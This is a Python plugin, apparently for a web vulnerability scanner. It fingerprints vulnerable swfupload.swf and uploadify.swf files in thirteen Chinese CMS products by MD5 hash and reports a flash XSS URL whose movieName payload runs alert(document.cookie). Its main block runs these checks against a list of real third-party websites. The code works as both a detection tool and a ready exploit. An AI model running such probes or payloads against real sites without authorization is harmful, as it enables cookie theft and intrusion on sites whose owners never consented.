#!/usr/bin/env
#*_* coding: utf-8 *_*

#name: swfUpload.swf|uploadify.swf flash xss 合集
#author: yichin
#refer: http://www.wooyun.org/bugs/wooyun-2014-069833/

import md5

def assign(service, arg):
    if service == 'cmseasy':
        return True,arg+'common/swfupload/swfupload.swf'
    if service == 'espcms':
        return True, arg+'adminsoft/js/swfupload.swf'
    if service == 'phpcms':
        return True, arg+'statics/js/swfupload/swfupload.swf'
    if service == 'dedecms':
        return True, arg+'images/swfupload/swfupload.swf'
    if service == 'phpyun':
        return True, arg+'js/upload/swfupload/swfupload.swf'
    if service == 'thinksns':
        return True, arg+'addons/theme/stv1/_static/js/swfupload/swfupload.swf'
    if service == '74cms':
        return True, arg+'admin/kindeditor/plugins/multiimage/images/swfupload.swf'
    if service == 'phpdisk':
        return True, arg+'includes/js/upload.swf'
    if service == 'php168':
        return True, arg+'js/swfupload/swfupload.swf'
    if service == 'kesioncms':
        return True, arg+'Plus/swfupload/swfupload/swfupload.swf'
    if service == 'pageadmin':
        return True, arg+'e/incs/fckeditor/editor/plugins/swfupload/js/swfupload.swf'
    if service == 'emlog':
        return True, arg+'include/lib/js/uploadify/uploadify.swf'
    if service == 'sdcms':
        return True, arg+'lib/swf/swfupload.swf'

def audit(arg):
    md5_list = [
        '3a1c6cc728dddc258091a601f28a9c12',
        '53fef78841c3fae1ee992ae324a51620',
        '4c2fc69dc91c885837ce55d03493a5f5',        
    ]
    code, head, res, err, _ = curl.curl2(arg)
    if code == 200:
        md5_value = md5.new(res).hexdigest()
        if md5_value in md5_list:
            security_warning(arg + '?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28document.cookie%29}}// flash xss')
        else:
            #debug(arg + ' **_**' + md5_value)
            pass
    else:
        #debug(arg + '**__**not found')
        pass

if __name__ == '__main__':
    from dummy import *
    audit(assign('cmseasy', 'http://demo.cmseasy.cn/')[1])
    audit(assign('espcms', 'http://demo.ecisp.cn/')[1])
    audit(assign('phpcms', 'http://www.phpcms.cn/')[1])
    audit(assign('phpyun', 'http://www.hr135.com/')[1])
    audit(assign('thinksns', 'http://demo.thinksns.com/ts4/')[1])
    audit(assign('74cms', 'http://www.dqol.cn/')[1])
    audit(assign('phpdisk', 'http://demo.phpdisk.com/f/')[1])	#暂无特征
    audit(assign('php168', 'http://www.php168.cn/')[1])
    audit(assign('kesioncms', 'http://demo.kesion.com/')[1])	#暂无特征
    audit(assign('pageadmin', 'http://www.ylbyst.com/')[1])
    audit(assign('emlog', 'http://blog.emlog.net/')[1])
    audit(assign('sdcms', 'http://www.bazhefz.com/')[1])		#暂无特征
    
